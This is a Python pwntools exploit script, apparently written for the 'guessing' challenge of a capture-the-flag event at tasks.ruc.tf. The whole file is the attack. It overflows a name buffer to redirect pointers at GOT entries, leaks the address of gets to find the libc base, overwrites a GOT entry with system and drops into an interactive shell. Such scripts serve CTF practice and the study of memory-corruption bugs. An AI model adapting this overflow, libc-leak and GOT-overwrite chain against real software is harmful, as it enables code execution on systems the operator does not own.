#!/usr/bin/env python
from pwn import *
import argparse
import sys
import os


# 127.0.0.1:4000 is for QIRA debuging socket

ADDR = 'tasks.ruc.tf' or '127.0.0.1'
PORT = 2003 or 4000
LIBC_PATH = 'libc.so.6'
BINARY_PATH = './guessing'
DEBUG = False


def chunks(it, s):
    return [it[i:i+s] for i in xrange(0, len(it), s)]


def local():
    io = process(os.path.normpath(os.path.join(os.getcwd(), BINARY_PATH)))

    return io


def debug():
    global DEBUG
    DEBUG = True
    
    return local()


def start(arguments):        
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', help='Mode to run sploit', type=str, nargs='?', default='local')
    parser.add_argument('-d', '--debug', help='Run sploit locally with DEBUG=True', action='store_true')
    parser.add_argument('-a', '--addr', help='Sometimes you may want to specify different addr without changing in script', type=str)
    parser.add_argument('-p', '--port', help='Same about port', type=int)
    opts = parser.parse_args(arguments)
    

    if opts.debug:
        io = debug()

    elif opts.mode == 'remote':
        global ADDR, PORT
        ADDR = opts.addr if opts.addr else ADDR
        PORT = opts.port if opts.port else PORT

        io = remote(ADDR, PORT)

    else:
        io = local()

    return io



def main(argc, argv):

    io = start(argv[1:])
    
    print io.recvuntil('[?] Please, input your name\n')
    if DEBUG:
        raw_input('g?')
    io.sendline('\x00'.ljust(0x110+8, 'a') + p64(0x602088))
    print io.recvuntil('[?] Please, input a city where are you from\n')
    io.sendline(p64(0x400c47))
    print io.recv(100500)
    io.sendline('1')

    print io.recvuntil('[?] Please, input your name\n')
    io.sendline('hren s gori')
    print io.recvuntil('[?] Please, input a city where are you from\n')
    io.sendline('kekovsk')
    io.sendline('1337')

    print io.recvuntil('[?] Please, input your name\n')
    io.sendline('\x00'.ljust(0x110+8, 'b'))
    buf = 0x50*'c' + 'd' * 8 + p64(0x602058)
    print io.recvuntil('[?] Please, input a city where are you from\n')
    io.sendline(buf)
    io.recvuntil('from ')
    dump = io.recvuntil('!\n\n').strip()[:-1]
    print hexdump(dump)
    log.info('LEAKED_GETS: %#x' % u64(dump.ljust(8,'\x00')))
    libc = ELF(LIBC_PATH)
    libc_base = u64(dump.ljust(8,'\x00')) - libc.symbols['gets']
    log.info("LIBC_BASE: %#x" % libc_base)
    libc_system = libc_base + libc.symbols['system']
    log.info("LIBC_SYSTEM: %#x" % libc_system)
    io.sendline('88')

    print io.recvuntil('[?] Please, input your name\n')
    io.sendline('asdfdasf\x00'.ljust(0x110+8, 'a') + p64(0x602078))
    print io.recvuntil('[?] Please, input a city where are you from\n')
    io.sendline(p32(0x400791) + '\x00\x00\x00')
    print io.recv(100500)
    io.sendline('1488')

    print 'And last but not least'
    print io.recvuntil('[?] Please, input your name\n')
    io.sendline('ls\x00'.ljust(0x110+8, 'a') + p64(0x602028))
    print io.recvuntil('[?] Please, input a city where are you from\n')
    io.sendline(p64(libc_system))
    io.interactive()


    io.close()



if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))
